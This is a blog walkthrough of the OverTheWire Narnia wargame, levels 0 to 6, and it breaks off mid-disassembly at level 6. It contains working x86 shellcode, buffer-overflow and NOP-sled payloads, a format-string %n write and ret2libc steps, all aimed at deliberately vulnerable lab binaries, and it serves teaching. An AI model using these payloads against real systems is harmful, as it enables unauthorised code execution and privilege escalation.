---
layout: post
title: "Narnia Wargame Writeup"
date: 2014-06-01 14:09:02 +0300
comments: true
categories: 
---

Introduction
------------
I decided to take a little break from [microcorruption](http://www.microcorruption.com) (still need to writeup the level before last and do the last one) and do some x86 exploitation instead. The wargame I chose to solve is Narnia, which is run by the great guys at [OverTheWire](http://overthewire.org) and is focused at basic Linux/x86 exploitation. If you don't want any spoilers, then continue no further. However, if you already solved the wargame and in a different way than me, please feel free to email me your solutions, as it's a great way to learn new things.

Please note that all the levels are distributed under GPLv2. I decided to state this here in order not to prepend the entire license to each level.

Level 0
-------

```
#include <stdio.h>
#include <stdlib.h>
 
int main(){
    long val=0x41414141;
    char buf[20];
                     
    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef)
        system("/bin/sh");
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

Since `buf` and `val` are both stored on the stack, with `val` just below (in higher memory address) `buf`, we can simply overflow `buf` with 24 bytes, so that the last four bytes will overwrite `val` with the correct value. Using `gdb` this becomes clearer:

```
narnia0@melinda:/narnia$ gdb -q ./narnia0
Reading symbols from /games/narnia/narnia0...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x080484c4 <+0>:     push   ebp
0x080484c5 <+1>:     mov    ebp,esp
0x080484c7 <+3>:     and    esp,0xfffffff0
0x080484ca <+6>:     sub    esp,0x30
0x080484cd <+9>:     mov    DWORD PTR [esp+0x2c],0x41414141
0x080484d5 <+17>:    mov    DWORD PTR [esp],0x8048640
0x080484dc <+24>:    call   0x80483b0 <puts@plt>
0x080484e1 <+29>:    mov    eax,0x8048673
0x080484e6 <+34>:    mov    DWORD PTR [esp],eax
0x080484e9 <+37>:    call   0x80483a0 <printf@plt>
0x080484ee <+42>:    mov    eax,0x8048689
0x080484f3 <+47>:    lea    edx,[esp+0x18]
0x080484f7 <+51>:    mov    DWORD PTR [esp+0x4],edx
0x080484fb <+55>:    mov    DWORD PTR [esp],eax
0x080484fe <+58>:    call   0x8048400 <__isoc99_scanf@plt>
0x08048503 <+63>:    mov    eax,0x804868e
0x08048508 <+68>:    lea    edx,[esp+0x18]
0x0804850c <+72>:    mov    DWORD PTR [esp+0x4],edx
0x08048510 <+76>:    mov    DWORD PTR [esp],eax
0x08048513 <+79>:    call   0x80483a0 <printf@plt>
0x08048518 <+84>:    mov    eax,0x8048697
0x0804851d <+89>:    mov    edx,DWORD PTR [esp+0x2c]
0x08048521 <+93>:    mov    DWORD PTR [esp+0x4],edx
0x08048525 <+97>:    mov    DWORD PTR [esp],eax
0x08048528 <+100>:   call   0x80483a0 <printf@plt>
0x0804852d <+105>:   cmp    DWORD PTR [esp+0x2c],0xdeadbeef
0x08048535 <+113>:   jne    0x804854a <main+134>
0x08048537 <+115>:   mov    DWORD PTR [esp],0x80486a4
0x0804853e <+122>:   call   0x80483c0 <system@plt>
0x08048543 <+127>:   mov    eax,0x0
0x08048548 <+132>:   leave
0x08048549 <+133>:   ret
0x0804854a <+134>:   mov    DWORD PTR [esp],0x80486ac
0x08048551 <+141>:   call   0x80483b0 <puts@plt>
0x08048556 <+146>:   mov    DWORD PTR [esp],0x1
0x0804855d <+153>:   call   0x80483e0 <exit@plt>
End of assembler dump.
(gdb) b *main+63
Breakpoint 1 at 0x8048503
(gdb) r
Starting program: /games/narnia/narnia0

point 1, 0x08048503 in main ()
(gdb) x/30xw $esp
0xffffd700:     0x08048689      0xffffd718      0x08049ff4      0x08048591
0xffffd710:     0xffffffff      0xf7e5f116      0x61616161      0x61616161
0xffffd720:     0xf7feb600      0x00000000      0x08048579      0x41414141
0xffffd730:     0x08048570      0x00000000      0x00000000      0xf7e454b3
0xffffd740:     0x00000001      0xffffd7d4      0xffffd7dc      0xf7fd3000
0xffffd750:     0x00000000      0xffffd71c      0xffffd7dc      0x00000000
0xffffd760:     0x0804825c      0xf7fceff4      0x00000000      0x00000000
0xffffd770:     0x00000000      0x602098d8
```

Examining the stack just after `scanf` returns we can see our input at `0xffffd718` and `val` just after it at `0xffffd72c`. In order to get the shell we need `val` to be `0xdeadbeef`, but since x86 is little endian, multibyte values are stored in reverse order in memory.

```
[idosch@nacho ~]$ python2 -c "print '\x41'*20 + '\xef\xbe\xad\xde'" | xclip -i
arnia0@melinda:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance:
buf:
val: 0xdeadbeef
$ whoami
narnia1
```

Note that I didn't include the flag and input. The latter is because octopress has problem showing non-standard characters.

Level 1:
--------

```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

This one is pretty straightforward. A shellcode should be placed in the env-variable `EGG` (which is located on the stack), so that a shell is spawned with permissions of `narnia2`.

First, lets check that the stack is indeed executable:

```
narnia1@melinda:/narnia$ readelf -a narnia1 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

Writing a shell-spawning shellcode is described in a lot of places so i'll simply paste mine here with comments:

```
BITS 32

; int execve(const char *path, char *const argv[], char *const envp[])

xor eax, eax        ; zero eax
push eax            ; null terminate the string
push 0x68732f2f     ; push //sh (// is same as / for our purpose)
push 0x6e69622f     ; push /bin
mov ebx, esp        ; pass first argument using ebx
push eax            ; third argument is empty
mov edx, esp
push eax            ; second argument is empty
mov ecx, esp
mov al, 11          ; execve is system call #11
int 0x80            ; issue an interrupt
```

Now we simply need to assemble it and put it in the env-variable `EGG`:

```
narnia1@melinda:/narnia$ mkdir /tmp/doge1
narnia1@melinda:/narnia$ cd /tmp/doge1
narnia1@melinda:/tmp/doge1$ vim shellcode.asm
narnia1@melinda:/tmp/doge1$ nasm shellcode.asm 
narnia1@melinda:/tmp/doge1$ export EGG=$(cat shellcode)
narnia1@melinda:/tmp/doge1$ /narnia/narnia1
Trying to execute EGG!
$ whoami 
narnia2
```

Level 2:
--------

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];
                    
    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

To solve this level the return address of `main` needs to be overwritten with the address of a shell-spawning shellcode. Since the stack is executable we can simply put the shellcode in an env-variable as before. However, we first need to determine how many bytes must be written to `buf` until the return address is overwritten. This can be done by simply using different length inputs (above 128) or `gdb`:

```
narnia2@melinda:/narnia$ gdb -q ./narnia2
Reading symbols from /games/narnia/narnia2...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x08048424 <+0>:     push   ebp
0x08048425 <+1>:     mov    ebp,esp
0x08048427 <+3>:     and    esp,0xfffffff0
0x0804842a <+6>:     sub    esp,0x90
0x08048430 <+12>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048434 <+16>:    jne    0x8048458 <main+52>
0x08048436 <+18>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048439 <+21>:    mov    edx,DWORD PTR [eax]
0x0804843b <+23>:    mov    eax,0x8048560
0x08048440 <+28>:    mov    DWORD PTR [esp+0x4],edx
0x08048444 <+32>:    mov    DWORD PTR [esp],eax
0x08048447 <+35>:    call   0x8048320 <printf@plt>
0x0804844c <+40>:    mov    DWORD PTR [esp],0x1
0x08048453 <+47>:    call   0x8048350 <exit@plt>
0x08048458 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
0x0804845b <+55>:    add    eax,0x4
0x0804845e <+58>:    mov    eax,DWORD PTR [eax]
0x08048460 <+60>:    mov    DWORD PTR [esp+0x4],eax
0x08048464 <+64>:    lea    eax,[esp+0x10]
0x08048468 <+68>:    mov    DWORD PTR [esp],eax
0x0804846b <+71>:    call   0x8048330 <strcpy@plt>
0x08048470 <+76>:    mov    eax,0x8048574
0x08048475 <+81>:    lea    edx,[esp+0x10]
0x08048479 <+85>:    mov    DWORD PTR [esp+0x4],edx
0x0804847d <+89>:    mov    DWORD PTR [esp],eax
0x08048480 <+92>:    call   0x8048320 <printf@plt>
0x08048485 <+97>:    mov    eax,0x0
0x0804848a <+102>:   leave
0x0804848b <+103>:   ret
End of assembler dump.
(gdb) b *main+97
Breakpoint 1 at 0x8048485
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /games/narnia/narnia2 AAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048485 in main ()
(gdb) x/50xw $esp
0xffffd650:     0x08048574      0xffffd660      0x00000001      0xf7ec4a79
0xffffd660:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd670:     0x41414141      0x41414141      0x00414141      0xf7e5efc3
0xffffd680:     0x08048258      0x00000000      0x00ca0000      0x00000001
0xffffd690:     0xffffd8b0      0x0000002f      0xffffd6ec      0xf7fceff4
0xffffd6a0:     0x08048490      0x08049750      0x00000002      0x080482fd
0xffffd6b0:     0xf7fcf3e4      0x00008000      0x08049750      0x080484b1
0xffffd6c0:     0xffffffff      0xf7e5f116      0xf7fceff4      0xf7e5f1a5
0xffffd6d0:     0xf7feb660      0x00000000      0x08048499      0xf7fceff4
0xffffd6e0:     0x08048490      0x00000000      0x00000000      0xf7e454b3
0xffffd6f0:     0x00000002      0xffffd784      0xffffd790      0xf7fd3000
0xffffd700:     0x00000000      0xffffd71c      0xffffd790      0x00000000
0xffffd710:     0x0804821c      0xf7fceff4
(gdb) i f
Stack level 0, frame at 0xffffd6f0:
eip = 0x8048485 in main; saved eip 0xf7e454b3
Arglist at 0xffffd6e8, args:
Locals at 0xffffd6e8, Previous frame's sp is 0xffffd6f0
Saved registers:
ebp at 0xffffd6e8, eip at 0xffffd6ec
(gdb) p 0xffffd6ec-0xffffd660
$1 = 140

(gdb) x/5s $esp+0x250
0xffffd8a0:      ",\b\256\022\066h]\a\237\071ri686"
0xffffd8b0:      "/games/narnia/narnia2"
0xffffd8c6:      'A' <repeats 27 times>
0xffffd8e2:      "SHELLCODE=1\300Ph//shh/bin\211\343P\211\342P\211\341\260\v\315\200"
0xffffd906:      "SHELL=/bin/bash"
```

Thus, 140 bytes are needed until the return address at `0xffffd6ec` can be overwritten with our shellcode at `0xffffd8e2`. However, the length of our argument as well as the debugger itself can shift this address. A possible solution is to make the program segfault and then examine the core dump for the exact address of `SHELLCODE`:

```
narnia2@melinda:/tmp/doge2$ ulimit -c unlimited
narnia2@melinda:/tmp/doge2$ ./narnia2 $(python -c "print '\x41'*140 + '\xff'*4")
Segmentation fault (core dumped)
narnia2@melinda:/tmp/doge2$ gdb -q -c ./core
[New LWP 8717]
Core was generated by `./narnia2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0xffffffff in ?? ()
(gdb) x/4s $esp+0x250
0xffffd8f0:      "\377\377"
0xffffd8f3:      "SHELLCODE=1\300Ph//shh/bin\211\343P\211\342P\211\341\260\v\315\200"
0xffffd917:      "TERM=screen"
0xffffd923:      "SHELL=/bin/bash"
```

Now we can use the correct address of `SHELLCODE` (`0xffffd8fd`) in our exploit:

```
narnia2@melinda:/narnia$ ./narnia2 $(python -c "print '\x41'*140 + '\xfd\xd8\xff\xff'")
$ whoami
narnia3
```

Level 3:
--------

```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }
    
    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

Again, this level is solved using a simple buffer overflow. Since `ofile` is stored just below `ifile` on the stack we can overflow `ifile` so that `ofile` is changed to a file we can actually open. The obvious choice for `ifile` is of course `/etc/narnia_pass/narnia4`, but unfortunately it's too short for our overflow. However, a possible solution is to symlink this file to a file with a long name that ends with the path to the file we wish to write to:

```
narnia3@melinda:/tmp/doge3$ ln -s /etc/narnia_pass/narnia4 $(python -c "print '\x41'*32 + 'pass'")
narnia3@melinda:/tmp/doge3$ touch pass
narnia3@melinda:/tmp/doge3$ /narnia/narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApass 
copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApass to a safer place... (pass)
```

Level 4:
--------

```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

The obvious solution is to overwrite the return address with that of a shell-spawning shellcode. However, unlike previous levels we can't place our shellcode in an environment variable, as they are all zeroed before `main` returns. Fortunately, the stack is executable so we can place our shellcode there and change the return address so that it's executed. Using `gdb` we can extract the relevant memory locations:

```
narnia4@melinda:/narnia$ gdb -q --args ./narnia4 AAAAAAAAAAAAAAAAAAAAAAAA
Reading symbols from /games/narnia/narnia4...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     push   edi
   0x08048448 <+4>:     and    esp,0xfffffff0
   0x0804844b <+7>:     sub    esp,0x130
   0x08048451 <+13>:    mov    DWORD PTR [esp+0x12c],0x0
   0x0804845c <+24>:    jmp    0x80484c0 <main+124>
   0x0804845e <+26>:    mov    eax,ds:0x80497d0
   0x08048463 <+31>:    mov    edx,DWORD PTR [esp+0x12c]
   0x0804846a <+38>:    shl    edx,0x2
   0x0804846d <+41>:    add    eax,edx
   0x0804846f <+43>:    mov    eax,DWORD PTR [eax]
   0x08048471 <+45>:    mov    DWORD PTR [esp+0x1c],0xffffffff
   0x08048479 <+53>:    mov    edx,eax
   0x0804847b <+55>:    mov    eax,0x0
   0x08048480 <+60>:    mov    ecx,DWORD PTR [esp+0x1c]
   0x08048484 <+64>:    mov    edi,edx
   0x08048486 <+66>:    repnz scas al,BYTE PTR es:[edi]
   0x08048488 <+68>:    mov    eax,ecx
   0x0804848a <+70>:    not    eax
   0x0804848c <+72>:    lea    ecx,[eax-0x1]
   0x0804848f <+75>:    mov    eax,ds:0x80497d0
   0x08048494 <+80>:    mov    edx,DWORD PTR [esp+0x12c]
   0x0804849b <+87>:    shl    edx,0x2
   0x0804849e <+90>:    add    eax,edx
   0x080484a0 <+92>:    mov    eax,DWORD PTR [eax]
   0x080484a2 <+94>:    mov    edx,ecx
   0x080484a4 <+96>:    mov    DWORD PTR [esp+0x8],edx
   0x080484a8 <+100>:   mov    DWORD PTR [esp+0x4],0x0
   0x080484b0 <+108>:   mov    DWORD PTR [esp],eax
   0x080484b3 <+111>:   call   0x8048380 <memset@plt>
   0x080484b8 <+116>:   add    DWORD PTR [esp+0x12c],0x1
   0x080484c0 <+124>:   mov    eax,ds:0x80497d0
   0x080484c5 <+129>:   mov    edx,DWORD PTR [esp+0x12c]
   0x080484cc <+136>:   shl    edx,0x2
   0x080484cf <+139>:   add    eax,edx
   0x080484d1 <+141>:   mov    eax,DWORD PTR [eax]
   0x080484d3 <+143>:   test   eax,eax
   0x080484d5 <+145>:   jne    0x804845e <main+26>
   0x080484d7 <+147>:   cmp    DWORD PTR [ebp+0x8],0x1
   0x080484db <+151>:   jle    0x80484f5 <main+177>
   0x080484dd <+153>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080484e0 <+156>:   add    eax,0x4
   0x080484e3 <+159>:   mov    eax,DWORD PTR [eax]
   0x080484e5 <+161>:   mov    DWORD PTR [esp+0x4],eax
   0x080484e9 <+165>:   lea    eax,[esp+0x2c]
   0x080484ed <+169>:   mov    DWORD PTR [esp],eax
   0x080484f0 <+172>:   call   0x8048350 <strcpy@plt>
   0x080484f5 <+177>:   mov    eax,0x0
   0x080484fa <+182>:   mov    edi,DWORD PTR [ebp-0x4]
   0x080484fd <+185>:   leave
   0x080484fe <+186>:   ret
End of assembler dump.
(gdb) b *main+182
Breakpoint 1 at 0x80484fa
(gdb) r
Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080484fa in main ()
(gdb) x/50xw $esp
0xffffd5e0:     0xffffd60c      0xffffd8ec      0x00000021      0xf7ff7d54
0xffffd5f0:     0xf7e2fe38      0x00000000      0x00000026      0xffffffff
0xffffd600:     0x00000000      0x00000000      0x00000001      0x41414141
0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd620:     0x41414141      0x00000000      0xf7ec4440      0xf7ec471e
0xffffd630:     0xffffd668      0xf7ffcff4      0xf7ffdad0      0xffffd754
0xffffd640:     0xffffd710      0xf7fe5fb9      0xffffd6f0      0x080481ec
0xffffd650:     0xffffd6d8      0xf7ffda74      0x00000000      0xf7fd32e8
0xffffd660:     0x00000001      0x00000000      0x00000001      0xf7ffd918
0xffffd670:     0x00000000      0x00000000      0x00000000      0xf7fceff4
0xffffd680:     0xffffd6ce      0xffffd6cf      0x00000001      0xf7ec4a79
0xffffd690:     0xffffd6cf      0xffffd6ce      0x00000000      0xf7ff249c
0xffffd6a0:     0xffffd754      0x00000000
(gdb) i f
Stack level 0, frame at 0xffffd720:
eip = 0x80484fa in main; saved eip 0xf7e454b3
Arglist at 0xffffd718, args:
Locals at 0xffffd718, Previous frame's sp is 0xffffd720
Saved registers:
ebp at 0xffffd718, edi at 0xffffd714, eip at 0xffffd71c
(gdb) p 0xffffd71c-0xffffd60c
$1 = 272
```

Overwriting the return address with an incorrect address can cause our shellcode not be executed and since we can't use the debugger to get the exact location of our shellcode we've got a problem. A possible solution is make the program segfault and analyze the core dump, but since we need to fill the stack with junk bytes anyway (in addition to our shellcode) until overwriting the return address we can use them to form a [nop-sled](http://en.wikipedia.org/wiki/NOP_slide), which will give us some flexibility regarding the return address.

Examining the stack with an appropriate input size (276 bytes), we see the following:

```
narnia4@melinda:/narnia$ gdb -q --args ./narnia4 $(python -c "print '\x41'*276") 
Reading symbols from /games/narnia/narnia4...(no debugging symbols found)...done.
(gdb) b *main+182
Breakpoint 1 at 0x80484fa
(gdb) r

Breakpoint 1, 0x080484fa in main ()
(gdb) x/100xw $esp
0xffffd4e0:     0xffffd50c      0xffffd7f0      0x00000021      0xf7ff7d54
0xffffd4f0:     0xf7e2fe38      0x00000000      0x00000026      0xffffffff
0xffffd500:     0x00000000      0x00000000      0x00000001      0x41414141
0xffffd510:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd520:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd530:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd540:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd550:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd560:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd570:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd580:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd590:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd600:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd620:     0x00000000      0xffffd6b4      0xffffd6c0      0xf7fd3000
0xffffd630:     0x00000000      0xffffd61c      0xffffd6c0      0x00000000
0xffffd640:     0x0804824c      0xf7fceff4      0x00000000      0x00000000
0xffffd650:     0x00000000      0x7d265f34      0x4a22fb24      0x00000000
0xffffd660:     0x00000000      0x00000000      0x00000002      0x08048390
(gdb) i f
Stack level 0, frame at 0xffffd620:
 eip = 0x80484fa in main; saved eip 0x41414141
 Arglist at 0xffffd618, args: 
 Locals at 0xffffd618, Previous frame's sp is 0xffffd620
 Saved registers:
 ebp at 0xffffd618, edi at 0xffffd614, eip at 0xffffd61c
```

Our input starts at `0xffffd50c` and the return address is at `0xffffd61c`. Thus, a good value to overwrite the return address with is `0xffffd596`:

```
narnia4@melinda:/narnia$ cd /tmp/doge4
narnia4@melinda:/tmp/doge4$ vim input.py 
narnia4@melinda:/tmp/doge4$ cat input.py 
shellcode = ('\x90'*227 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69' +
             '\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' +
             '\x41'*20 + '\x96\xd5\xff\xff')
print shellcode
narnia4@melinda:/tmp/doge4$ /narnia/narnia4 $(python input.py)
$ whoami
narnia5
```

Level 5:
--------

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);
    buffer[sizeof (buffer) - 1] = 0;
    printf("Change i's value from 1 -> 500. ");

    if(i==500){
        printf("GOOD\n");
        system("/bin/sh");
    }

    printf("No way...let me give you a hint!\n");
    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
    printf ("i = %d (%p)\n", i, &i);
    return 0;
}
```

Here we can't change the value of `i` using a simple buffer overflow since the `snprintf` function limits the number of bytes that are written to the stack. However, using a simple format string exploit we can make this function write to arbitrary memory locations. Using `ltrace` we'll first find which parameter number corresponds to our format string:

```
narnia5@melinda:/narnia$ ltrace -s 500 ./narnia5 $(python -c "print 'AAAA' + '%8\$08x'")
__libc_start_main(0x8048444, 2, -10284, 0x8048520, 0x8048590 <unfinished ...>
snprintf("AAAAffffd73c", 64, "AAAA%8$08x", 0xf7e5efc3)                                                                           = 12
printf("Change i's value from 1 -> 500. ")                                                                                       = 32
puts("No way...let me give you a hint!"Change i's value from 1 -> 500. No way...let me give you a hint!
)                                                                                         = 33
printf("buffer : [%s] (%d)\n", "AAAAffffd73c", 12buffer : [AAAAffffd73c] (12)
)                                                                               = 29
printf("i = %d (%p)\n", 1, 0xffffd72ci = 1 (0xffffd72c)
)                                                                                           = 19
+++ exited (status 0) +++
narnia5@melinda:/narnia$ ltrace -s 500 ./narnia5 $(python -c "print 'AAAA' + '%9\$08x'")
__libc_start_main(0x8048444, 2, -10284, 0x8048520, 0x8048590 <unfinished ...>
snprintf("AAAA41414141", 64, "AAAA%9$08x", 0xf7e5efc3)                                                                           = 12
printf("Change i's value from 1 -> 500. ")                                                                                       = 32
puts("No way...let me give you a hint!"Change i's value from 1 -> 500. No way...let me give you a hint!
)                                                                                         = 33
printf("buffer : [%s] (%d)\n", "AAAA41414141", 12buffer : [AAAA41414141] (12)
)                                                                               = 29
printf("i = %d (%p)\n", 1, 0xffffd72ci = 1 (0xffffd72c)
)                                                                                           = 19
+++ exited (status 0) +++
```

which is `9`. Now it's possible to use the `%n` specifier in order to write the printed number of bytes to the the variable `i`:

```
narnia5@melinda:/narnia$ ./narnia5 $(printf "\x2c\xd7\xff\xff")%496x%9\$n
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
```

Level 6:
--------

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int  (*fp)(char *)=(int(*)(char *))&puts, i;

    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

    /* clear environ */
    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));
    /* clear argz    */
    for(i=3; argv[i] != NULL; i++)
        memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1,argv[1]);
    strcpy(b2,argv[2]);
    if(((unsigned long)fp & 0xff000000) == 0xff000000)
        exit(-1);
    fp(b1);

    exit(1);
}
```

Unlike previous levels, in this level the stack isn't executable, thus preventing us from directing execution flow to our shellcode. However, what we can do is change `fp` to point to a different function than `puts`. A worthy choice is `system`, which has the same signature as `puts`:

```
SYSTEM(3)                       Linux Programmer's Manual                       SYSTEM(3)

NAME
       system - execute a shell command

       SYNOPSIS
              #include <stdlib.h>

              int system(const char *command);
```

Thankfully, [ASLR](http://en.wikipedia.org/wiki/Address_space_layout_randomization) isn't used, so this is a classic [ret2libc](http://en.wikipedia.org/wiki/Return-to-libc_attack) scenario. We begin by retrieving the address of `system` and examining the stack just before the call to `fp`:

```
narnia6@melinda:/narnia$ gdb -q --args ./narnia6 $(python -c "print '\x41'*8 + ' ' + '\x42'*8")
Reading symbols from /games/narnia/narnia6...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080484d4 <+0>:     push   ebp
   0x080484d5 <+1>:     mov    ebp,esp
   0x080484d7 <+3>:     push   edi
   0x080484d8 <+4>:     and    esp,0xfffffff0
   0x080484db <+7>:     sub    esp,0x40
   0x080484de <+10>:    mov    DWORD PTR [esp+0x38],0x80483d0
   0x080484e6 <+18>:    cmp    DWORD PTR [ebp+0x8],0x3
   0x080484ea <+22>:    je     0x804850e <main+58>
   0x080484ec <+24>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484ef <+27>:    mov    edx,DWORD PTR [eax]
   0x080484f1 <+29>:    mov    eax,0x8048730
   0x080484f6 <+34>:    mov    DWORD PTR [esp+0x4],edx
   0x080484fa <+38>:    mov    DWORD PTR [esp],eax
   0x080484fd <+41>:    call   0x80483b0 <printf@plt>
   0x08048502 <+46>:    mov    DWORD PTR [esp],0xffffffff
   0x08048509 <+53>:    call   0x80483f0 <exit@plt>
   0x0804850e <+58>:    mov    DWORD PTR [esp+0x3c],0x0
   0x08048516 <+66>:    jmp    0x8048571 <main+157>
   0x08048518 <+68>:    mov    eax,ds:0x8049940
   0x0804851d <+73>:    mov    edx,DWORD PTR [esp+0x3c]
   0x08048521 <+77>:    shl    edx,0x2
   0x08048524 <+80>:    add    eax,edx
   0x08048526 <+82>:    mov    eax,DWORD PTR [eax]
   0x08048528 <+84>:    mov    DWORD PTR [esp+0x1c],0xffffffff
   0x08048530 <+92>:    mov    edx,eax
   0x08048532 <+94>:    mov    eax,0x0
   0x08048537 <+99>:    mov    ecx,DWORD PTR [esp+0x1c]
   0x0804853b <+103>:   mov    edi,edx
   0x0804853d <+105>:   repnz scas al,BYTE PTR es:[edi]
   0x0804853f <+107>:   mov    eax,ecx
   0x08048541 <+109>:   not    eax
   0x08048543 <+111>:   lea    ecx,[eax-0x1]
   0x08048546 <+114>:   mov    eax,ds:0x8049940
   0x0804854b <+119>:   mov    edx,DWORD PTR [esp+0x3c]
   0x0804854f <+123>:   shl    edx,0x2
   0x08048552 <+126>:   add    eax,edx
   0x08048554 <+128>:   mov    eax,DWORD PTR [eax]
   0x08048556 <+130>:   mov    edx,ecx
   0x08048558 <+132>:   mov    DWORD PTR [esp+0x8],edx
   0x0804855c <+136>:   mov    DWORD PTR [esp+0x4],0x0
   0x08048564 <+144>:   mov    DWORD PTR [esp],eax
   0x08048567 <+147>:   call   0x8048410 <memset@plt>
   0x0804856c <+152>:   add    DWORD PTR [esp+0x3c],0x1
   0x08048571 <+157>:   mov    eax,ds:0x8049940
   0x08048576 <+162>:   mov    edx,DWORD PTR [esp+0x3c]
   0x0804857a <+166>:   shl    edx,0x2
   0x0804857d <+169>:   add    eax,edx
   0x0804857f <+171>:   mov    eax,DWORD PTR [eax]
   0x08048581 <+173>:   test   eax,eax
   0x08048583 <+175>:   jne    0x8048518 <main+68>
   0x08048585 <+177>:   mov    DWORD PTR [esp+0x3c],0x3
   0x0804858d <+185>:   jmp    0x80485de <main+266>
   0x0804858f <+187>:   mov    eax,DWORD PTR [esp+0x3c]
   0x08048593 <+191>:   shl    eax,0x2
   0x08048596 <+194>:   add    eax,DWORD PTR [ebp+0xc]
   0x08048599 <+197>:   mov    eax,DWORD PTR [eax]
   0x0804859b <+199>:   mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080485a3 <+207>:   mov    edx,eax
   0x080485a5 <+209>:   mov    eax,0x0
   0x080485aa <+214>:   mov    ecx,DWORD PTR [esp+0x1c]
   0x080485ae <+218>:   mov    edi,edx
   ---Type <return> to continue, or q <return> to quit---
   0x080485b0 <+220>:   repnz scas al,BYTE PTR es:[edi]
   0x080485b2 <+222>:   mov    eax,ecx
   0x080485b4 <+224>:   not    eax
   0x080485b6 <+226>:   lea    edx,[eax-0x1]
   0x080485b9 <+229>:   mov    eax,DWORD PTR [esp+0x3c]
   0x080485bd <+233>:   shl    eax,0x2
   0x080485c0 <+236>:   add    eax,DWORD PTR [ebp+0xc]
